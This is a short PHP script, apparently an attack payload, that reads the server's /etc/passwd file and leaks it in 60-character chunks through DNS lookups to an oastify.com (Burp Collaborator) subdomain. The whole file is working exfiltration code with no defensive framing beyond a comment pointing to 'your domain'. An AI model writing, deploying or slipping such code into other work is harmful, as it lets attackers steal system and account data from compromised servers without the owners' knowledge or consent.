<?php
// dns_oob.php
$data = str_replace("\n","",file_get_contents('/etc/passwd'));
foreach (str_split($data,60) as $chunk) {
    // trigger many tiny DNS lookups to your domain:
    gethostbyname($chunk . '.3txcw6ddtt1btb2gwvi5bvsej5pwdm1b.oastify.com');
}
